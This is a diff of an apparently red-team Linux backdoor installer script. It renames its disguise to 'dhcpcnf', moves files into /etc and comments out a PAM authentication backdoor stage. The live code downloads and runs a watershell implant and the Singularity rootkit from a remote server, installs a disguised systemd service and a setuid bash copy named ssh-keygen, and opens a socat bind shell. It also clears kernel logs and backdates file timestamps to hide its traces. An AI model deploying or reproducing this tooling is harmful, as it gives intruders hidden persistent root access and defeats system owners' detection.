@@ -21,10 +21,10 @@ fi
 
 SYSTEM=""
 
-export NAME="dnsctl"
+export NAME="dhcpcnf"
 
 # Create directories
-mkdir -p /opt/${NAME}
+mkdir -p /etc/${NAME}
 mkdir -p /dev/shm/${NAME}
 cd /dev/shm/${NAME}
 
@@ -49,99 +49,101 @@ if command -v apt &>/dev/null; then
     PKG_MANAGER="apt install -y"
     SYSTEM="debian"
     apt update -y
-    $PKG_MANAGER libpam0g-dev gcc make socat build-essential linux-headers-$(uname -r)
+    $PKG_MANAGER gcc make socat build-essential linux-headers-$(uname -r)
 elif command -v dnf &>/dev/null; then
     PKG_MANAGER="dnf install -y"
     SYSTEM="rhel"
     # dnf update -y
-    $PKG_MANAGER pam-devel gcc make socat kernel-devel-$(uname -r) elfutils-libelf-devel
+    $PKG_MANAGER gcc make socat kernel-devel-$(uname -r) elfutils-libelf-devel
 elif command -v yum &>/dev/null; then
     PKG_MANAGER="yum install -y"
     SYSTEM="rhel"
     # yum update -y
-    $PKG_MANAGER pam-devel gcc make  socat kernel-devel-$(uname -r) elfutils-libelf-devel
+    $PKG_MANAGER gcc make socat kernel-devel-$(uname -r) elfutils-libelf-devel
 else
     exit 1
 fi
 
 # Backdoor PAM
-$FETCH_CMD $SERV_IP_PORT/pam_backdoor.c
+# $FETCH_CMD $SERV_IP_PORT/pam_backdoor.c
 
-gcc -fPIC -shared -o pam_${NAME}.so pam_backdoor.c
+# gcc -fPIC -shared -o pam_${NAME}.so pam_backdoor.c
 
-# Modify PAM configuration
-if [ "$SYSTEM" = "debian" ]; then
-    PAM_SO_FILE=""
-    PAM_VAR="pam_${NAME}.so"
-    # Find module location
-    if [ -d /lib/x86_64-linux-gnu/security ]; then
-        PAM_SO_FILE="/lib/x86_64-linux-gnu/security/pam_${NAME}.so"
-    elif [ -d /lib/security ]; then
-        PAM_SO_FILE="/lib/security/pam_${NAME}.so"
-    elif [ -d /lib/i386-linux-gnu/security ]; then
-        PAM_SO_FILE="/lib/i386-linux-gnu/security/pam_${NAME}.so"
-    elif [ -d /usr/lib64/security ]; then
-        PAM_SO_FILE="/usr/lib64/security/pam_${NAME}.so"
-    elif [ -d /usr/lib/security ]; then
-        PAM_SO_FILE="/usr/lib/security/pam_${NAME}.so"
-    else
-        PAM_SO_FILE="/etc/pam.d/pam_${NAME}.so"
-        PAM_VAR="/etc/pam.d/pam_${NAME}.so"
-    fi
-    mv pam_${NAME}.so "$PAM_SO_FILE"
-    chmod -x "$PAM_SO_FILE"
-    if ! grep -qF "pam_${NAME}.so" "/etc/pam.d/common-auth"; then
-        awk -v newline="auth    sufficient                      $PAM_VAR" '
-            NF > 0 && $1 !~ /^#/ && !done {
-                print newline;
-                $0 = $0 " use_first_pass";
-                done = 1;
-            }
-            { print }
-        ' "/etc/pam.d/common-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/common-auth"
-    fi
-    touch -d "Jun 26 2022" "/etc/pam.d/common-auth"
-else
-    PAM_SO_FILE=""
-    PAM_VAR="pam_${NAME}.so"
-    # Find module location
-    if [ -d /lib64/security ]; then
-        PAM_SO_FILE="/lib64/security/pam_${NAME}.so"
-    elif [ -d /lib/security ]; then
-        PAM_SO_FILE="/lib/security/pam_${NAME}.so"
-    elif [ -d /usr/lib64/security ]; then
-        PAM_SO_FILE="/usr/lib64/security/pam_${NAME}.so"
-    elif [ -d /usr/lib/security ]; then
-        PAM_SO_FILE="/usr/lib/security/pam_${NAME}.so"
-    else
-        PAM_SO_FILE="/etc/security/pam_${NAME}.so"
-        PAM_VAR="/etc/pam.d/pam_${NAME}.so"
-    fi
-    mv pam_${NAME}.so "$PAM_SO_FILE"
-    chmod -x "$PAM_SO_FILE"
-    if ! grep -qF "pam_${NAME}.so" "/etc/pam.d/system-auth"; then
-        awk -v newline="auth        sufficient                                   $PAM_VAR" '
-            NF > 0 && $1 !~ /^#/ && !done {
-                print newline;
-                $0 = $0 " use_first_pass";
-                done = 1;
-            }
-            { print }
-        ' "/etc/pam.d/system-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/system-auth"
-    fi
-    if ! grep -qF "pam_${NAME}.so" "/etc/pam.d/password-auth"; then
-        awk -v newline="auth        sufficient                                   $PAM_VAR" '
-            NF > 0 && $1 !~ /^#/ && !done {
-                print newline;
-                $0 = $0 " use_first_pass";
-                done = 1;
-            }
-            { print }
-        ' "/etc/pam.d/password-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/password-auth"
-    fi  
-    touch -d "Jun 26 2022" "/etc/pam.d/system-auth"
-    touch -d "Jun 26 2022" "/etc/pam.d/password-auth"
-fi  
+# # Modify PAM configuration
+# if [ "$SYSTEM" = "debian" ]; then
+#     $PKG_MANAGER libpam0g-dev
+#     PAM_SO_FILE=""
+#     PAM_VAR="pam_${NAME}.so"
+#     # Find module location
+#     if [ -d /lib/x86_64-linux-gnu/security ]; then
+#         PAM_SO_FILE="/lib/x86_64-linux-gnu/security/pam_${NAME}.so"
+#     elif [ -d /lib/security ]; then
+#         PAM_SO_FILE="/lib/security/pam_${NAME}.so"
+#     elif [ -d /lib/i386-linux-gnu/security ]; then
+#         PAM_SO_FILE="/lib/i386-linux-gnu/security/pam_${NAME}.so"
+#     elif [ -d /usr/lib64/security ]; then
+#         PAM_SO_FILE="/usr/lib64/security/pam_${NAME}.so"
+#     elif [ -d /usr/lib/security ]; then
+#         PAM_SO_FILE="/usr/lib/security/pam_${NAME}.so"
+#     else
+#         PAM_SO_FILE="/etc/pam.d/pam_${NAME}.so"
+#         PAM_VAR="/etc/pam.d/pam_${NAME}.so"
+#     fi
+#     mv pam_${NAME}.so "$PAM_SO_FILE"
+#     chmod -x "$PAM_SO_FILE"
+#     if ! grep -qF "pam_${NAME}.so" "/etc/pam.d/common-auth"; then
+#         awk -v newline="auth    sufficient                      $PAM_VAR" '
+#             NF > 0 && $1 !~ /^#/ && !done {
+#                 print newline;
+#                 $0 = $0 " use_first_pass";
+#                 done = 1;
+#             }
+#             { print }
+#         ' "/etc/pam.d/common-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/common-auth"
+#     fi
+#     touch -d "Jun 26 2022" "/etc/pam.d/common-auth"
+# else
+#     $PKG_MANAGER pam-devel 
+#     PAM_SO_FILE=""
+#     PAM_VAR="pam_${NAME}.so"
+#     # Find module location
+#     if [ -d /lib64/security ]; then
+#         PAM_SO_FILE="/lib64/security/pam_${NAME}.so"
+#     elif [ -d /lib/security ]; then
+#         PAM_SO_FILE="/lib/security/pam_${NAME}.so"
+#     elif [ -d /usr/lib64/security ]; then
+#         PAM_SO_FILE="/usr/lib64/security/pam_${NAME}.so"
+#     elif [ -d /usr/lib/security ]; then
+#         PAM_SO_FILE="/usr/lib/security/pam_${NAME}.so"
+#     else
+#         PAM_SO_FILE="/etc/security/pam_${NAME}.so"
+#         PAM_VAR="/etc/pam.d/pam_${NAME}.so"
+#     fi
+#     mv pam_${NAME}.so "$PAM_SO_FILE"
+#     chmod -x "$PAM_SO_FILE"
+#     if ! grep -qF "pam_${NAME}.so" "/etc/pam.d/system-auth"; then
+#         awk -v newline="auth        sufficient                                   $PAM_VAR" '
+#             NF > 0 && $1 !~ /^#/ && !done {
+#                 print newline;
+#                 $0 = $0 " use_first_pass";
+#                 done = 1;
+#             }
+#             { print }
+#         ' "/etc/pam.d/system-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/system-auth"
+#     fi
+#     if ! grep -qF "pam_${NAME}.so" "/etc/pam.d/password-auth"; then
+#         awk -v newline="auth        sufficient                                   $PAM_VAR" '
+#             NF > 0 && $1 !~ /^#/ && !done {
+#                 print newline;
+#                 $0 = $0 " use_first_pass";
+#                 done = 1;
+#             }
+#             { print }
+#         ' "/etc/pam.d/password-auth" > /tmp/.pam_temp && mv /tmp/.pam_temp "/etc/pam.d/password-auth"
+#     fi  
+#     touch -d "Jun 26 2022" "/etc/pam.d/system-auth"
+#     touch -d "Jun 26 2022" "/etc/pam.d/password-auth"
+# fi  
 
 
 # Enable root login - not necessary if using a key
@@ -159,9 +161,9 @@ $FETCH_CMD "$SERV_IP_PORT/watershell.tar.gz"
 tar -xvf watershell.tar.gz
 rm watershell.tar.gz
 cd watershell
-gcc -o ${NAME}_sys watershell.c || mv ${NAME}_sys /opt/${NAME}/
-mv ${NAME}_sys /opt/${NAME}/
-/opt/${NAME}/${NAME}_sys &
+gcc -o ${NAME}_sys watershell.c || mv ${NAME}_sys /etc/${NAME}/
+mv ${NAME}_sys /etc/${NAME}/
+/etc/${NAME}/${NAME}_sys &
 cat > /etc/systemd/system/${NAME}_sys.service <<EOF
 [Unit]
 Description=${NAME^} Authentication System Service
@@ -169,7 +171,7 @@ After=network-online.target
 Wants=network-online.target
 
 [Service]
-ExecStart=/opt/${NAME}/${NAME}_sys &
+ExecStart=/etc/${NAME}/${NAME}_sys &
 RemainAfterExit=yes
 
 [Install]
@@ -187,7 +189,7 @@ cp $(which bash) /usr/lib/openssh/ssh-keygen
 chmod u+s /usr/lib/openssh/ssh-keygen
 
 # Set up triggerable
-cat > /opt/${NAME}/trigger.sh << EOF
+cat > /etc/${NAME}/trigger.sh << EOF
 #!/bin/bash
 set -euo pipefail
 
@@ -242,10 +244,12 @@ if ! grep -Fq "AuthorizedKeysFile .ssh/authorized_keys /etc/ssh/.ssh/authorized_
 fi
 
 # Bind shell
-socat TCP-LISTEN:59834,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
+socat TCP-LISTEN:58348,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &
 EOF
 
-chmod +x /opt/${NAME}/trigger.sh
+chmod +x /etc/${NAME}/trigger.sh
+
+bash /etc/${NAME}/trigger.sh
 
 # Determine kernel version
 KERNEL_MAJOR=$(uname -r | cut -d'.' -f1)
@@ -284,7 +288,7 @@ else
     $FETCH_CMD $SERV_IP_PORT/singularity.tar.gz
     tar -xvf singularity.tar.gz
     rm singularity.tar.gz
-    cd Singularity
+    cd singularity
     chmod +x ./load_and_persistence.sh
     ./load_and_persistence.sh
     chmod +x ./scripts/journal.sh
@@ -297,7 +301,7 @@ dmesg -C
 # Change file dates
 touch -d "May 10 2019" "/etc/ssh/sshd_config"
 touch -d "Jun 14 2018" "/etc/pam.d"
-touch -d "Aug 2 2018" "/opt"
+touch -d "Aug 2 2018" "/etc"
 touch -d "Dec 11 2019" "/usr/lib/openssh/ssh-keygen"
 touch -d "Dec 21 2019" "$(which ip)"
 touch -d "Dec 29 2019" "$(which chroot)"
